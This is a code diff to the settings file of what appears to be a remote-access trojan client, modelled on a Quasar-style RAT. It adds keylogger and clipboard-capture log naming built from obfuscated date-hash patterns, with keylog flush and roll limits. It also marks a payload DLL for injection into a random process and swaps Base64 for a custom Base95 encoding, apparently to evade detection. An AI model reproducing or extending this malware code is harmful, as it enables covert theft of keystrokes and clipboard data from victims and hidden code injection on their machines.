@@ -1,6 +1,8 @@
-﻿using Q3C273.Shared.Cryptography;
+﻿using ByteEncodings;
+using Q3C273.Shared.Cryptography;
 using System;
 using System.IO;
+using System.Linq;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
@@ -12,6 +14,7 @@ namespace Ton618.Config
     /// </summary>
     public static class Settings
     {
+        #region Values set from Client Builder
 #if DEBUG
         public static string VERSION = Application.ProductVersion;
         public static string HOSTS = "localhost:4782;";
@@ -69,7 +72,7 @@ namespace Ton618.Config
         public static string INSTALLPATH = "";
         public static string LOGSPATH = "";
         public static bool UNATTENDEDMODE = false;
-        public static string PAYLOADDLL = "";
+        public static string PAYLOADDLL = ""; // Will be DLL-injected to random process
 
         public static bool Initialize()
         {
@@ -85,17 +88,27 @@ namespace Ton618.Config
             STARTUPKEY = aes.Decrypt(STARTUPKEY);
             LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
             SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
-            SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
+            SERVERCERTIFICATE = new X509Certificate2(Alphabet.Base95Alphabet.GetBytes(aes.Decrypt(SERVERCERTIFICATESTR)).ToArray());
             PAYLOADDLL = aes.Decrypt(PAYLOADDLL);
             SetupPaths();
             return VerifyHash();
         }
 #endif
+        #endregion
+
+        #region Additional hard-coded constants
+        public static string GetKeyLogFileNameFormat(int index) => string.Format("k_{0}.LOG", Sha256.ComputeHash(DateTime.UtcNow.ToString("yyyy*MM!dd") + index.ToString("X04")));
+
+        public static string GetClipLogFileNameFormat(int index) => string.Format("c_{0}.LOG", Sha256.ComputeHash(DateTime.UtcNow.ToString("yyyy(MM#dd") + index.ToString("X04")));
+
+        public static long KeyLogFlushInterval = 15000; // 15 seconds
+        public static long KeyLogRollSize = 5 * 1024 * 1024; // 5 MiB;
+        #endregion
 
         static void SetupPaths()
         {
             LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
-            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
+            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + Path.DirectorySeparatorChar : "") + INSTALLNAME);
         }
 
         static bool VerifyHash()
@@ -104,7 +117,7 @@ namespace Ton618.Config
             {
                 var csp = (RSACryptoServiceProvider)SERVERCERTIFICATE.PublicKey.Key;
                 return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY)), CryptoConfig.MapNameToOID("SHA256"),
-                    Convert.FromBase64String(SERVERSIGNATURE));
+                    Alphabet.Base95Alphabet.GetBytes(SERVERSIGNATURE).ToArray());
 
             }
             catch (Exception e)
